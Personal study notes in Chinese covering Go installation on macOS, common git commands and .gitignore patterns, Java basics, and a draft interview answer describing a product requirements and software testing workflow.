mac：可以用brew install go

```shell
brew install go # mac安装最新版go
go version # 在go安装目录可检验go是否安装成功，在mac会自动配置环境变量，任意位置可用
go env # 获取go的相关参数，重要参数为GOPATH和GOROOT
```

**go的源码需要在GOPATH路径下进行存储**

在vscode中可以用Code Runner进行右键运行代码配置




# git
git是分布式版本控制工具
svn是集中式控制工具

![image-20231212105646124](./测试开发.assets/image-20231212105646124.png)

新建文件，未跟踪（untracked），使用git add状态变为staged，之后可使用git rm移除版本库；未修改（unmodify）；修改（modified）可使用git add添加到暂存区，也可以用git checkout丢弃修改;staged可以用git commit将修改同步到库中，使用后变为未修改状态，使用git reset head filename取消暂存，文件状态为已修改

###### git命令

```zsh
git config -l # 查看配置
git add . # 将所有的需要进行版本管理的文件放入暂存区域
git commit -m “说明”  # 将暂存区域的文件提交到本地仓库
git push # 将本地仓库推送到云仓库
git pull # 将云仓库拉到工作区
git clone # 克隆代码
git pull # 拉取代码
git init # 初始化项目
git clone url # 下载代码，.git后缀可省略
git staus
git branch # 查看本地分支
  git branch -r # 查看远程分支
  git branch new_codebase_name # 创建新分支
  git branch -d codebase_name # 删除分支
  git branch -dr [remote/branch] # 删除远程分支
  git push origin --delete [branch-name] # 删除远程分支
git checkout oldBranch  # 切换分支
	git checkout -b [branch] #  新建一个分支，并切换到该分支

git reset --hard # 撤销本地修改
git tag -n # 查看项目仓库的标签
	git checkout 标签名  # 查看标签的代码
git diff 标签名1 标签名2 # 对比两个标签之间的不同
# 合并分支
	git merge [branch] # 合并指定分支到当前分支，会产生commit


# 默认忽略上传的文件，在主目录建立“./gitgnore”文件
    #注释           .gitignore的注释
    *.txt           忽略所有 .txt 后缀的文件
    !src.a          忽略除 src.a 外的其他文件
    /todo           仅忽略项目根目录下的 todo 文件，不包括 src/todo
    build/          忽略 build/目录下的所有文件，过滤整个build文件夹；
    doc/*.txt       忽略doc目录下所有 .txt 后缀的文件，但不包括doc子目录的 .txt 的文件

    bin/:           忽略当前路径下的 bin 文件夹，该文件夹下的所有内容都会被忽略，不忽略 bin 文件
    /bin:           忽略根目录下的 bin 文件
    /*.c:           忽略 cat.c，不忽略 build/cat.c
    debug/*.obj:    忽略debug/io.obj，不忽略 debug/common/io.obj和tools/debug/io.obj
    **/foo:         忽略/foo, a/foo, a/b/foo等
    a/**/b:         忽略a/b, a/x/b, a/x/y/b等
    !/bin/run.sh    不忽略bin目录下的run.sh文件
    *.log:          忽略所有 .log 文件
    config.js:      忽略当前路径的 config.js 文件

    /mtk/           忽略整个文件夹
    *.zip           忽略所有.zip文件
    /mtk/do.c       忽略某个具体文件
```

Ssh -keygen -t rsa 创建公钥并以rsa方式加密存储







# Flask开发







# Django开发











# java



## 基础知识



java的程序即是编译型也是解释型，代码经过编译后成为java字节码的中间语言，jvm（虚拟机）对字节码进行解释和运行，即编译执行一次，解释每次运行都会进行。

![image-20231221193744663](./测试开发.assets/image-20231221193744663.png)

java SE：java的标准版，用于桌面开发

java EE：java企业版，分布式网络

java ME：嵌入式系统开发

java APi文档













面试

说一下一个需求的流程

​	产品会出一个PRD文档，完整文档一般会提前1天发出，留出一定时间给开发、测试人员查看并提出意见。意见会在后续的评审会议进行答疑。需求评审完一般在第二天或第三天就会开始评审UE设计，跟需求评审是一个大概的思路。随后研发开始开发，平均是一天发两版到开发环境（standbox），项目新上线的时候甚至一天会上到三版以上。但这个不是每一版都会去测试，我们测的是线上环境；研发开发的同时，测试会根据需求编写测试用例，随后小组内简单查看，随后整个测试组评审，在开始测试前会和产品、研发进行最后一次评审。字节的冒烟测试是研发那边根据测试的p00和p0进行测试，所以一般上线前都是可测，但因为研发的设备没有测试设备多，所以在一些平板上仍经常会遇到p0的bug，主流场景每次上线都会进行一次回归测试，确保缺陷都会修复完成，其他缺陷验证完成以后就会关闭。



测试人员9个+5个=十五个人左右，研发没有数过，差不多有40多个人



我之前写的是一个关于IDE的交互，2天写了200多个测试用例，一般来说一天的测试用例就是50～80个左右，一般考虑到兼容性，但兼容性直接复制粘贴用例就可以了。
